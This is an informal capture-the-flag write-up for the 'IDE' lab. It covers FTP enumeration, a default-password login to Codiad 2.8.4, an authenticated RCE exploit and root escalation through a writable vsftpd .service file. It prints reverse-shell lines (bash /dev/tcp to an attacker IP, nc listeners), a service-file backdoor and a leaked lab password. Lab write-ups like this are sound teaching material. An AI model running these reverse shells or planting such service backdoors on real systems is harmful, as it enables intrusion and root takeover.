@@ -1,0 +1,102 @@
+# IDE
+
+This CTF taught me basic Priv Escalation using .service files
+
+---
+
+---
+
+1. Started Off With An NMAP scan and found ports
+    1. 21-FTP
+    2. 22-SSH
+    3. 80-HTTP
+
+---
+
+1. Anonymous Login Was Allowed on FTP so i connected and started looking around and found a hidden note called “-” with the  contents 
+    1. “Hey John, I have reset the Password you have asked, please use the default password to login, Also please take care of the image file ;)” - maybe steganograghy is needed
+    2. so i downloaded it onto my machine and moved onto 80
+
+---
+
+1. The port 80 website was just the default Apache2 site and couldnt find anything in source code so i moved onto some scans, 
+
+---
+
+1. the scans gave me literally nothing and i was lost for a bit so i went back to doing a full 655524 Port scan and found a hidden port
+    1. 62337-HTTP, This was a website running “codiad 2.8.4” and when i went onto to it i was on a login page
+
+---
+
+1. then i remebered the FTP note about john needing to use default password so i tried, “John:Password” and it worked, i could of brute forced it also
+
+---
+
+1. So i did some looking around and found nothing of use so i looked for an exploit on 2.8.4 and found an authenticated RCE exploit
+
+---
+
+1. So i Downloaded It And Ran it and i needed to open 2 New Terminals and enter
+    
+    ```python
+    echo 'bash -c "bash -i >/dev/tcp/10.4.49.64/6667 0>&1 2>&1"' | nc -lnvp 6666
+    
+    nc -lnvp 6667
+    ```
+    
+    And Now i Had a FootHold into the system so onto to Priv Escalation
+    
+
+---
+
+1. I started some basic enumeration and couldnt find anything of use till i looked at The user “drac’s” bash-history which showed 
+    
+    ```python
+    mysql -u drac -p Th3dRaCULa1sR3aL
+    ```
+    
+    So Now i can do lateral priv escalation to a higher priv account
+    
+
+---
+
+1. So i logged in via ssh and it worked so onto more priv escalation
+
+---
+
+1. There was nothing sticking out till i did sudo -l  and saw drac could run
+    
+    ```python
+    (ALL : ALL) /usr/sbin/service vsftpd restart
+    ```
+    
+    what this means is drac may restart the ftp service but since he can use sudo it will run as root user
+    
+    so i found out where the start up config .service file and saw drac may write to it
+    
+
+---
+
+1. According to [hacktrickz.xyz](http://hacktrickz.xyz) if a user can write to the .service file they can make it run their backdoor anytime the service is Started,retsarted and Stopped
+
+---
+
+1. so i used nano to open it and next to the “on service start” i enter
+    
+    ```python
+    /bin/bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"
+    ```
+    
+    What this does is, everytime the vsftpd service is started it will execute that command, we could put any .sh script in there
+    
+
+---
+
+1. so now all i had to do is restart it usinf the command drac is allowed to run as sudo
+2. 
+
+```python
+sudo /usr/sbin/service vsftpd restart
+```
+
+and i got the root shell back on my listener
